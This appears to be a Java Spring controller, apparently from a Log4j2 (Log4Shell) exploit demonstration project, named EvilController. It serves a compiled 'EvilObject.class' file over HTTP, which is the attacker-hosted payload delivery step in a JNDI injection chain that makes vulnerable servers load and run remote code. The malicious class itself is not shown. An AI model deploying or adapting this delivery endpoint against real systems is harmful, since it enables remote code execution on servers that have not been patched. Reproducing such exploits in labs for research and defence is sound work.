package com.github.zheng93775.log4j2.controller;

import org.apache.commons.io.IOUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.core.io.ClassPathResource;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

@Controller
public class EvilController {

    private static final Logger logger = LogManager.getLogger(EvilController.class);

    @GetMapping("/EvilObject.class")
    public void code(HttpServletResponse response) throws IOException {
        System.out.println("/EvilObject.class access");
        InputStream is = new ClassPathResource("EvilObject.class").getInputStream();
        byte[] bytes = IOUtils.toByteArray(is);
        response.getOutputStream().write(bytes);
    }
}
